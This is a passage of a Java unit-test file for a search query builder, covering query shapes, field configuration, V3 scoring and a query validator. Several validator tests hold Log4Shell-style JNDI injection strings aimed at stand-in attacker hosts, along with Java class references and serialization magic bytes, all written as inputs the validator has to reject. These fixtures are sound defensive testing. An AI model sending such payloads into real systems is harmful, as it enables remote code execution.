        new SearchFlags().setFulltext(true).setFieldConfiguration(null, SetMode.REMOVE_IF_NULL);

    when(opContextNullConfig.getEntityRegistry()).thenReturn(operationContext.getEntityRegistry());
    when(opContextNullConfig.getObjectMapper()).thenReturn(operationContext.getObjectMapper());
    when(opContextNullConfig.getSearchContext()).thenReturn(searchContext);
    when(searchContext.getSearchFlags()).thenReturn(searchFlags);

    // Should not throw and should use default behavior
    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            builderWithNullConfig.buildQuery(
                opContextNullConfig,
                ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                "testQuery",
                true);

    assertNotNull(result);

    // Test with null search flags
    when(searchContext.getSearchFlags()).thenReturn(null);

    FunctionScoreQueryBuilder resultNullFlags =
        (FunctionScoreQueryBuilder)
            builderWithNullConfig.buildQuery(
                opContextNullConfig,
                ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                "testQuery",
                true);

    assertNotNull(resultNullFlags);
  }

  @Test
  public void testFieldConfigurationWithStructuredQuery() {
    CustomSearchConfiguration customConfig =
        CustomSearchConfiguration.builder()
            .fieldConfigurations(
                Map.of(
                    "structured",
                    FieldConfiguration.builder()
                        .searchFields(
                            SearchFields.builder().replace(List.of("keyPart1", "urn")).build())
                        .build()))
            .queryConfigurations(
                List.of(
                    QueryConfiguration.builder().queryRegex(".*").structuredQuery(true).build()))
            .build();

    SearchQueryBuilder builderWithFieldConfig =
        new SearchQueryBuilder(testQueryConfig, customConfig);

    OperationContext opContextWithFieldConfig = mock(OperationContext.class);
    SearchContext searchContext = mock(SearchContext.class);
    SearchFlags searchFlags =
        new SearchFlags().setFulltext(false).setFieldConfiguration("structured");

    when(opContextWithFieldConfig.getEntityRegistry())
        .thenReturn(operationContext.getEntityRegistry());
    when(opContextWithFieldConfig.getObjectMapper()).thenReturn(operationContext.getObjectMapper());
    when(opContextWithFieldConfig.getSearchContext()).thenReturn(searchContext);
    when(searchContext.getSearchFlags()).thenReturn(searchFlags);

    // Note: Current implementation doesn't apply field configuration to structured queries
    // This test documents that behavior
    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            builderWithFieldConfig.buildQuery(
                opContextWithFieldConfig,
                ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                "testQuery",
                false);

    BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
    List<QueryBuilder> shouldQueries = mainQuery.should();

    // Structured query should still use all fields (field configuration not applied)
    QueryStringQueryBuilder structuredQuery = (QueryStringQueryBuilder) shouldQueries.get(0);
    Map<String, Float> fields = structuredQuery.fields();

    // Should contain all standard fields, not just the replaced ones
    assertTrue(fields.size() > 2);
    assertTrue(fields.containsKey("customProperties"));
  }

  @Test
  public void testValidateSearchQuery_ValidQueries() {
    // These queries should all pass validation without throwing exceptions
    List<String> validQueries =
        Arrays.asList(
            "test query",
            "user:john AND department:engineering",
            "name:dataset*",
            "field:value OR field2:value2",
            "exact phrase search",
            "special-chars_allowed.here@example.com",
            "unicode支持中文",
            "numbers 12345",
            "*",
            "",
            "  whitespace  ");

    for (String query : validQueries) {
      // Should not throw ValidationException
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_ControlCharacters_NullByte() {
    String maliciousQuery = "test\u0000query";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_ControlCharacters_Bell() {
    String maliciousQuery = "test\u0007query";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_ControlCharacters_Delete() {
    String maliciousQuery = "test\u007Fquery";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaClassReference_JavaUtil() {
    String maliciousQuery = "java.util.HashMap";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaClassReference_JavaLang() {
    String maliciousQuery = "java.lang.Runtime";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaClassReference_JavaxNaming() {
    String maliciousQuery = "javax.naming.Context";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaClassReference_SpringFramework() {
    String maliciousQuery = "org.springframework.context.ApplicationContext";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaClassReference_ComSun() {
    String maliciousQuery = "com.sun.jndi.rmi.registry.RegistryContext";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaClassReference_CaseInsensitive() {
    String maliciousQuery = "JAVA.UTIL.HashMap";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_LDAP() {
    String maliciousQuery = "ldap://attacker.com/exploit";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_RMI() {
    String maliciousQuery = "rmi://evil.com:1099/Exploit";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_DNS() {
    String maliciousQuery = "dns://malicious.example.com";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_IIOP() {
    String maliciousQuery = "iiop://evil.com:900/obj";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_JNDI() {
    String maliciousQuery = "jndi:ldap://attacker.com/a";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_Oastify() {
    String maliciousQuery = "test.oastify.com";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JNDIInjection_CaseInsensitive() {
    String maliciousQuery = "LDAP://ATTACKER.COM/exploit";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_SerializationMagicBytes_Unicode() {
    String maliciousQuery = "test\u00ac\u00edquery";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_SerializationMagicBytes_Escaped() {
    String maliciousQuery = "test\\xac\\xedquery";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_ExceedsMaxLength() {
    // Create a query that exceeds the max length
    // Assuming default max is 1000 characters based on typical configuration
    StringBuilder longQuery = new StringBuilder();
    for (int i = 0; i < 1001; i++) {
      longQuery.append("a");
    }
    TEST_BUILDER.validateSearchQuery(longQuery.toString());
  }

  @Test
  public void testValidateSearchQuery_MaxLengthBoundary() {
    // Create a query at exactly max length - should pass
    // This test assumes max length of 500
    StringBuilder query = new StringBuilder();
    for (int i = 0; i < 500; i++) {
      query.append("a");
    }
    // Should not throw exception
    TEST_BUILDER.validateSearchQuery(query.toString());
  }

  @Test
  public void testValidateSearchQuery_ComplexValidQuery() {
    // Complex but valid query with various operators and special chars
    String complexQuery =
        "name:dataset* AND (tags:pii OR tags:sensitive) "
            + "NOT deprecated:true platform:\"snowflake\"";
    TEST_BUILDER.validateSearchQuery(complexQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_Log4ShellPattern() {
    // Test Log4Shell-style attack pattern
    String maliciousQuery = "${jndi:ldap://evil.com/a}";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_ObfuscatedJNDI() {
    // Test obfuscated JNDI pattern
    String maliciousQuery = "test ${jndi:rmi://attacker.com:1099/obj} query";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test
  public void testValidateSearchQuery_URLsInData() {
    // URLs in actual data should be allowed (not JNDI protocols)
    List<String> validURLQueries =
        Arrays.asList(
            "https://example.com",
            "http://mysite.com/page",
            "ftp://files.example.com",
            "mailto:user@example.com");

    for (String query : validURLQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test
  public void testValidateSearchQuery_JavaKeywordsInData() {
    // Java keywords in actual data context should be allowed
    // (the pattern looks for package structures)
    List<String> validQueries =
        Arrays.asList("java developer", "util function", "naming convention", "language support");

    for (String query : validQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_CombinedAttack() {
    // Combination of multiple attack vectors
    String maliciousQuery = "java.lang.Runtime ${jndi:ldap://evil.com/x} \u0000";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test
  public void testValidateSearchQuery_EmptyAndWhitespace() {
    // Edge cases that should be valid
    TEST_BUILDER.validateSearchQuery("");
    TEST_BUILDER.validateSearchQuery("   ");
    TEST_BUILDER.validateSearchQuery("\t");
    TEST_BUILDER.validateSearchQuery("\n");
  }

  @Test
  public void testValidateSearchQuery_SpecialSearchSyntax() {
    // Valid Elasticsearch/OpenSearch query syntax
    List<String> validSyntaxQueries =
        Arrays.asList(
            "field:value",
            "field1:value1 AND field2:value2",
            "field:value*",
            "field:[1 TO 100]",
            "(field1:value1 OR field2:value2) AND field3:value3",
            "field:\"exact phrase\"",
            "_exists_:field",
            "field:>100",
            "field:>=100 AND field:<=200");

    for (String query : validSyntaxQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testBuildQuery_ValidationApplied() {
    // Test that validation is actually applied during query building
    TEST_BUILDER.buildQuery(
        opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "java.lang.Runtime", true);
  }

  @Test
  public void testBuildQuery_ValidQuerySucceeds() {
    // Test that valid queries pass through validation and build successfully
    QueryBuilder result =
        TEST_BUILDER.buildQuery(
            opContext,
            ImmutableList.of(TestEntitySpecBuilder.getSpec()),
            "valid search query",
            true);
    assertNotNull(result);
  }

  @Test
  public void testValidateSearchQuery_EdgeCasePatterns() {
    // Test patterns that might look suspicious but are valid
    List<String> edgeCaseQueries =
        Arrays.asList(
            "javascript:void(0)", // javascript protocol (not JNDI)
            "file:///path/to/file", // file protocol (not JNDI)
            "data:text/plain,hello", // data URI (not JNDI)
            "java_developer", // underscore separator
            "util_function", // not a package reference
            "my-ldap-server", // ldap in name but not protocol
            "rmi_connection", // rmi in name but not protocol
            "javax.annotation @Override" // annotation reference in text
            );

    for (String query : edgeCaseQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaIO() {
    String maliciousQuery = "java.io.FileInputStream";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_JavaxXML() {
    String maliciousQuery = "javax.xml.transform.Transformer";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_OrgApache() {
    String maliciousQuery = "org.apache.commons.collections.Transformer";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test
  public void testValidateSearchQuery_Unicode() {
    // Unicode characters should be allowed
    List<String> unicodeQueries =
        Arrays.asList("用户名称", "データセット", "사용자", "Пользователь", "مستخدم", "emoji🔍search");

    for (String query : unicodeQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test
  public void testValidateSearchQuery_StructuredQueryPrefix() {
    // Test that structured query prefix doesn't interfere
    String structuredQuery = STRUCTURED_QUERY_PREFIX + "field:value";
    TEST_BUILDER.validateSearchQuery(structuredQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_StructuredQueryWithAttack() {
    String maliciousQuery = STRUCTURED_QUERY_PREFIX + "java.lang.Runtime";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testCustomBuilder_ValidationApplied() {
    // Test that custom builder also applies validation
    TEST_CUSTOM_BUILDER.buildQuery(
        opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "ldap://evil.com/a", true);
  }

  @Test
  public void testValidateSearchQuery_QuotedStrings() {
    // Quoted strings should pass validation
    List<String> quotedQueries =
        Arrays.asList(
            "\"exact phrase match\"",
            "'single quoted'",
            "field:\"quoted value\"",
            "name:'John Doe'");

    for (String query : quotedQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_QuotedMalicious() {
    // Even quoted malicious content should be blocked
    String maliciousQuery = "\"ldap://evil.com/a\"";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test
  public void testValidateSearchQuery_Numbers() {
    // Numeric queries and ranges should be valid
    List<String> numericQueries =
        Arrays.asList("12345", "price:>100", "count:[10 TO 100]", "year:2023", "-42", "3.14159");

    for (String query : numericQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test
  public void testValidateSearchQuery_BooleanOperators() {
    // Boolean operators should be valid
    List<String> booleanQueries =
        Arrays.asList(
            "term1 AND term2",
            "term1 OR term2",
            "NOT term",
            "term1 AND (term2 OR term3)",
            "+required -excluded",
            "term1 && term2",
            "term1 || term2");

    for (String query : booleanQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testValidateSearchQuery_CorbaProtocol() {
    String maliciousQuery = "corba:iiop://evil.com:900/obj";
    TEST_BUILDER.validateSearchQuery(maliciousQuery);
  }

  @Test
  public void testValidateSearchQuery_WildcardsAndRegex() {
    // Wildcards and basic regex patterns should be valid
    List<String> wildcardQueries =
        Arrays.asList("test*", "?est", "te?t*", "field:test*", "field:/regex.*/", "*:*");

    for (String query : wildcardQueries) {
      TEST_BUILDER.validateSearchQuery(query);
    }
  }

  @Test
  public void testV3QueryUsesStage1Shape() {
    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            TEST_V3_BUILDER.buildQuery(
                opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "testQuery", true);
    assertTrue(result.query() instanceof DisMaxQueryBuilder, result.query().toString());
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(result.query(), clauses);

    // OR simple queries, fuzzy except on the word gram fields
    List<SimpleQueryStringBuilder> simpleQueries =
        clauses.stream()
            .filter(SimpleQueryStringBuilder.class::isInstance)
            .map(SimpleQueryStringBuilder.class::cast)
            .collect(Collectors.toList());
    assertTrue(simpleQueries.stream().allMatch(sqs -> sqs.defaultOperator() == Operator.OR));
    assertTrue(
        simpleQueries.stream()
            .anyMatch(
                sqs ->
                    "testQuery~2".equals(sqs.value())
                        && TEXT_SEARCH_ANALYZER.equals(sqs.analyzer())),
        simpleQueries.toString());
    assertTrue(
        simpleQueries.stream()
            .anyMatch(
                sqs -> "testQuery".equals(sqs.value()) && sqs.analyzer().contains("word_gram")),
        simpleQueries.toString());
    // The synonym-priority copy of keyPart1 (boost 10) carries the 1.5x multiplier
    assertTrue(
        simpleQueries.stream()
            .anyMatch(sqs -> Float.valueOf(15.0f).equals(sqs.fields().get("keyPart1"))),
        simpleQueries.toString());

    // Exact urn matches: boost 10 x exact factor 10 x 6, and x 0.7 when the case differs
    List<Float> urnTermBoosts =
        clauses.stream()
            .filter(TermQueryBuilder.class::isInstance)
            .map(TermQueryBuilder.class::cast)
            .filter(term -> term.fieldName().equals("urn"))
            .map(TermQueryBuilder::boost)
            .collect(Collectors.toList());
    assertTrue(urnTermBoosts.contains(600.0f), urnTermBoosts.toString());
    assertTrue(urnTermBoosts.stream().anyMatch(b -> Math.abs(b - 420.0f) < 0.01f));

    // The contains-wildcard searches names and titles, not the URN
    assertTrue(
        clauses.stream()
            .filter(WildcardQueryBuilder.class::isInstance)
            .map(WildcardQueryBuilder.class::cast)
            .noneMatch(w -> w.fieldName().equals("urn.delimited")));
  }

  @Test
  public void testV3WildcardSearchesNamesAndTitlesOnly() {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            operationContext,
            List.of(
                operationContext.getEntityRegistry().getEntitySpec("dataset"),
                operationContext.getEntityRegistry().getEntitySpec("dashboard")),
            "Revenue",
            true),
        clauses);
    List<WildcardQueryBuilder> wildcards =
        clauses.stream()
            .filter(WildcardQueryBuilder.class::isInstance)
            .map(WildcardQueryBuilder.class::cast)
            .collect(Collectors.toList());
    assertEquals(
        wildcards.stream().map(WildcardQueryBuilder::fieldName).collect(Collectors.toSet()),
        Set.of("name.delimited", "title.delimited"));
    // A lower-cased pattern: case-insensitive wildcards fail shards on OpenSearch 3.x
    assertTrue(
        wildcards.stream().allMatch(w -> "*revenue*".equals(w.value()) && !w.caseInsensitive()),
        wildcards.toString());
    // At 0.3x the boost of the delimited subfield, 4 for both name and title
    for (WildcardQueryBuilder wildcard : wildcards) {
      assertEquals(wildcard.boost(), 4.0f * 0.3f, 0.001f, wildcard.toString());
    }
  }

  @Test
  public void testIsSameName() {
    for (String[] same :
        new String[][] {
          {"stg", "staging"},
          {"prod", "production"},
          {"dev", "development"},
          {"s3", "s_3"},
          {"data platform", "dataplatform"}
        }) {
      assertTrue(SearchQueryBuilder.isSameName(same[0], same[1]), String.join("/", same));
    }
    // Related names, and abbreviations too short to tell
    for (String[] related :
        new String[][] {{"glue", "athena"}, {"pg", "processing"}, {"ab", "airbyte"}}) {
      assertFalse(SearchQueryBuilder.isSameName(related[0], related[1]), String.join("/", related));
    }
  }

  @Test
  public void testV3ExactNameScoreSkipsRelatedNames() {
    // "athena" is a synonym of "glue" in the default file, but a different name
    List<QueryBuilder> glue = v3DatasetClauses("glue");
    assertEquals(exactNameConstants(glue), Set.of("glue"));
    assertTrue(
        glue.stream()
            .filter(MatchPhrasePrefixQueryBuilder.class::isInstance)
            .map(MatchPhrasePrefixQueryBuilder.class::cast)
            .noneMatch(prefix -> "athena".equals(prefix.value())));
    // A quoted query names a value, so it does not expand to its synonyms
    assertEquals(exactNameConstants(v3DatasetClauses("\"staging\"")), Set.of("staging"));
  }

  private List<QueryBuilder> v3DatasetClauses(String query) {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            operationContext,
            List.of(operationContext.getEntityRegistry().getEntitySpec("dataset")),
            query,
            true),
        clauses);
    return clauses;
  }

  private static Set<Object> exactNameConstants(List<QueryBuilder> clauses) {
    return clauses.stream()
        .filter(ConstantScoreQueryBuilder.class::isInstance)
        .map(cs -> (TermQueryBuilder) ((ConstantScoreQueryBuilder) cs).innerQuery())
        .filter(term -> term.fieldName().equals("name.keyword"))
        .map(TermQueryBuilder::value)
        .collect(Collectors.toSet());
  }

  @Test
  public void testV3ExactNameScoresAboveAnyPartialMatch() {
    EntitySpec datasetSpec = operationContext.getEntityRegistry().getEntitySpec("dataset");
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(operationContext, List.of(datasetSpec), "staging", true),
        clauses);
    List<ConstantScoreQueryBuilder> exactNames =
        clauses.stream()
            .filter(ConstantScoreQueryBuilder.class::isInstance)
            .map(ConstantScoreQueryBuilder.class::cast)
            .collect(Collectors.toList());
    assertTrue(exactNames.stream().allMatch(cs -> cs.boost() == 1000.0f));
    // The query and its synonym from the default synonym file, on the name keyword
    Set<Object> exactNameValues =
        exactNames.stream()
            .map(cs -> (TermQueryBuilder) cs.innerQuery())
            .filter(term -> term.fieldName().equals("name.keyword"))
            .map(TermQueryBuilder::value)
            .collect(Collectors.toSet());
    assertEquals(exactNameValues, Set.of("staging", "stg"));
  }

  @Test
  public void testV3MultiWordAndDottedQueriesAddBonusClauses() {
    EntitySpec datasetSpec = operationContext.getEntityRegistry().getEntitySpec("dataset");

    List<QueryBuilder> dotted = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            operationContext, List.of(datasetSpec), "my_db.sales.orders", true),
        dotted);
    assertTrue(
        dotted.stream()
            .filter(MatchQueryBuilder.class::isInstance)
            .map(MatchQueryBuilder.class::cast)
            .anyMatch(
                match ->
                    match.fieldName().equals("qualifiedName.delimited")
                        && match.operator() == Operator.AND
                        && match.boost() == 50.0f),
        dotted.toString());

    List<QueryBuilder> sentence = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            operationContext, List.of(datasetSpec), "orders placed by each customer", true),
        sentence);
    // Every word in the name, and every word in the description for four or more words
    assertTrue(
        sentence.stream()
            .filter(SimpleQueryStringBuilder.class::isInstance)
            .map(SimpleQueryStringBuilder.class::cast)
            .anyMatch(
                sqs -> sqs.defaultOperator() == Operator.AND && sqs.fields().containsKey("name")),
        sentence.toString());
    assertTrue(
        sentence.stream()
            .filter(MatchQueryBuilder.class::isInstance)
            .map(MatchQueryBuilder.class::cast)
            .anyMatch(
                match ->
                    match.fieldName().equals("description.delimited")
                        && match.operator() == Operator.AND),
        sentence.toString());
    // Multi-word queries skip the contains wildcard
    assertTrue(sentence.stream().noneMatch(WildcardQueryBuilder.class::isInstance));
  }

  @Test
  public void testV3UrnQueryTargetsIdentityFields() {
    String urn = "urn:li:dataset:(urn:li:dataPlatform:hive,my_db.orders,PROD)";
    BoolQueryBuilder query =
        (BoolQueryBuilder)
            ((FunctionScoreQueryBuilder)
                    TEST_V3_BUILDER.buildQuery(
                        opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), urn, true))
                .query();
    assertEquals(query.minimumShouldMatch(), "1");
    // The identity query: an exact urn term among its clauses
    BoolQueryBuilder identity = (BoolQueryBuilder) query.should().get(0);
    assertTrue(
        identity.should().stream()
            .anyMatch(
                clause ->
                    clause instanceof TermQueryBuilder
                        && ((TermQueryBuilder) clause).fieldName().equals("urn")
                        && urn.equals(((TermQueryBuilder) clause).value())),
        identity.toString());
    // V2's all-terms simple query, for URNs that differ in case or are cut short, and entities that
    // reference the URN
    BoolQueryBuilder allTerms = (BoolQueryBuilder) query.should().get(1);
    assertTrue(
        allTerms.should().stream()
            .map(SimpleQueryStringBuilder.class::cast)
            .allMatch(sqs -> sqs.defaultOperator() == Operator.AND),
        allTerms.toString());
  }

  @Test
  public void testV3CustomBoolQueryWrapsStage1AndIdentityQueries() throws IOException {
    CustomSearchConfiguration config =
        new YAMLMapper()
            .readValue(
                """
                queryConfigurations:
                  - queryRegex: .*
                    simpleQuery: true
                    prefixMatchQuery: true
                    exactMatchQuery: true
                    boolQuery:
                      must_not:
                        - term:
                            deprecated: true
                """,
                CustomSearchConfiguration.class);
    SearchQueryBuilder builder = new SearchQueryBuilder(testQueryConfig, config, true);
    for (String query :
        List.of("orders", "urn:li:dataset:(urn:li:dataPlatform:hive,my_db.orders,PROD)")) {
      BoolQueryBuilder root =
          (BoolQueryBuilder)
              ((FunctionScoreQueryBuilder)
                      builder.buildQuery(
                          opContext,
                          ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                          query,
                          true))
                  .query();
      assertEquals(root.mustNot().size(), 1, query);
      assertEquals(root.must().size(), 1, query);
    }
    // The light query keeps the wrapper too
    BoolQueryBuilder lightRoot =
        (BoolQueryBuilder)
            ((FunctionScoreQueryBuilder)
                    builder.buildQuery(
                        opContext,
                        ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                        "orders",
                        true,
                        true))
                .query();
    assertEquals(lightRoot.mustNot().size(), 1);
    assertEquals(lightRoot.must().size(), 1);
  }

  @Test
  public void testV3CustomConfigWithoutTextMatchesAddsNoBonusClauses() throws IOException {
    CustomSearchConfiguration config =
        new YAMLMapper()
            .readValue(
                """
                queryConfigurations:
                  - queryRegex: .*
                    simpleQuery: false
                    prefixMatchQuery: false
                    exactMatchQuery: false
                """,
                CustomSearchConfiguration.class);
    SearchQueryBuilder builder = new SearchQueryBuilder(testQueryConfig, config, true);
    EntitySpec datasetSpec = operationContext.getEntityRegistry().getEntitySpec("dataset");
    for (String query :
        List.of("orders", "orders2017", "my_db.sales.orders", "orders placed by each customer")) {
      List<QueryBuilder> clauses = new ArrayList<>();
      collectClauses(
          builder.buildQuery(operationContext, List.of(datasetSpec), query, true), clauses);
      assertTrue(
          clauses.stream()
              .noneMatch(
                  clause ->
                      clause instanceof WildcardQueryBuilder
                          || clause instanceof MatchQueryBuilder
                          || clause instanceof MultiMatchQueryBuilder
                          || clause instanceof SimpleQueryStringBuilder
                          || clause instanceof TermQueryBuilder),
          query + ": " + clauses);
      // No light query either, so the full query serves the search
      assertNull(builder.buildQuery(operationContext, List.of(datasetSpec), query, true, true));
    }
  }

  @Test
  public void testV3UnsplitQueryOnlyForLetterDigitRuns() {
    // "orders2017" also matches as the one token the analyzers index; an escaped operator does
    // not change any token, so it adds no copy
    assertTrue(v3SimpleQueryCount("orders2017") > v3SimpleQueryCount("orders 2017"));
    assertEquals(v3SimpleQueryCount("revenue -archive"), v3SimpleQueryCount("revenue archive"));
  }

  @Test
  public void testV3LongQueriesStayUnderTheClauseLimit() {
    EntitySpec datasetSpec = operationContext.getEntityRegistry().getEntitySpec("dataset");
    // One word gets every expansion; more words share a budget of expanded terms
    assertTrue(
        v3SimpleQueries(datasetSpec, "revenue").stream()
            .anyMatch(sqs -> sqs.value().contains("~") && sqs.fuzzyMaxExpansions() == 10));
    List<SimpleQueryStringBuilder> threeWords =
        v3SimpleQueries(datasetSpec, "quarterly revenue forecast");
    assertTrue(threeWords.stream().anyMatch(sqs -> sqs.value().contains("~")));
    assertTrue(
        threeWords.stream()
            .filter(sqs -> sqs.value().contains("~"))
            .allMatch(sqs -> sqs.fuzzyMaxExpansions() < 10));
    // Past the budget the words are matched without fuzziness
    assertTrue(
        v3SimpleQueries(
                datasetSpec,
                "quarterly revenue forecast regional breakdown customer retention analysis monthly"
                    + " pipeline inventory")
            .stream()
            .noneMatch(sqs -> sqs.value().contains("~")));
    // A pasted paragraph keeps the words that fit, an apostrophe or not
    List<SimpleQueryStringBuilder> paragraph =
        v3SimpleQueries(
            datasetSpec,
            "alpha's bravo charlie delta echo foxtrot golf hotel india juliet kilo lima mike"
                + " november oscar papa quebec romeo sierra tango");
    assertTrue(paragraph.stream().anyMatch(sqs -> sqs.value().contains("oscar")));
    assertTrue(paragraph.stream().noneMatch(sqs -> sqs.value().contains("papa")));
    // A letter/digit run counts its parts and its unsplit copy
    List<SimpleQueryStringBuilder> runs =
        v3SimpleQueries(
            datasetSpec,
            "orders2017 sales2018 ledger2019 orders2020 sales2021 ledger2022 orders2023 sales2024");
    assertTrue(runs.stream().anyMatch(sqs -> sqs.value().contains("ledger 2022")));
    assertTrue(runs.stream().noneMatch(sqs -> sqs.value().contains("2023")));
    // One run among plain words repeats them all in the unsplit copy
    List<SimpleQueryStringBuilder> mixed =
        v3SimpleQueries(
            datasetSpec,
            "alpha2017 bravo charlie delta echo foxtrot golf hotel india juliet kilo lima mike");
    assertTrue(mixed.stream().anyMatch(sqs -> sqs.value().contains("india")));
    assertTrue(mixed.stream().noneMatch(sqs -> sqs.value().contains("juliet")));
    // The analyzers split qualified names at the dots, so each part counts
    List<SimpleQueryStringBuilder> dotted =
        v3SimpleQueries(
            datasetSpec,
            "db.alpha db.bravo db.charlie db.delta db.echo db.foxtrot db.golf db.hotel db.india"
                + " db.juliet db.kilo db.lima");
    assertTrue(dotted.stream().anyMatch(sqs -> sqs.value().contains("hotel")));
    assertTrue(dotted.stream().noneMatch(sqs -> sqs.value().contains("india")));
    // A single word that does not fit, a deep dotted path or a long letter/digit run, keeps its
    // leading terms
    List<SimpleQueryStringBuilder> path =
        v3SimpleQueries(
            datasetSpec,
            "alpha.bravo.charlie.delta.echo.foxtrot.golf.hotel.india.juliet.kilo.lima.mike"
                + ".november.oscar.papa.quebec.romeo.sierra.tango.uniform.victor.whiskey.xray");
    assertTrue(path.stream().anyMatch(sqs -> sqs.value().contains("hotel")), path.toString());
    assertTrue(path.stream().noneMatch(sqs -> sqs.value().contains("xray")), path.toString());
    List<SimpleQueryStringBuilder> run =
        v3SimpleQueries(
            datasetSpec,
            "alpha2001bravo2002charlie2003delta2004echo2005foxtrot2006golf2007hotel2008"
                + "india2009juliet2010kilo2011lima2012mike2013november2014oscar2015");
    assertTrue(run.stream().anyMatch(sqs -> sqs.value().contains("hotel")), run.toString());
    assertTrue(run.stream().noneMatch(sqs -> sqs.value().contains("oscar")), run.toString());
    // So does one of numerals outside ASCII, or of letters outside the basic plane
    for (int first : new int[] {0x2460, 0x1D400}) {
      List<String> parts =
          IntStream.range(0, 40)
              .mapToObj(i -> Character.toString(first + i))
              .collect(Collectors.toList());
      List<SimpleQueryStringBuilder> cut = v3SimpleQueries(datasetSpec, String.join(".", parts));
      assertTrue(cut.stream().anyMatch(sqs -> sqs.value().contains(parts.get(0))), parts.get(0));
      assertTrue(cut.stream().noneMatch(sqs -> sqs.value().contains(parts.get(39))), parts.get(0));
    }
  }

  @Test
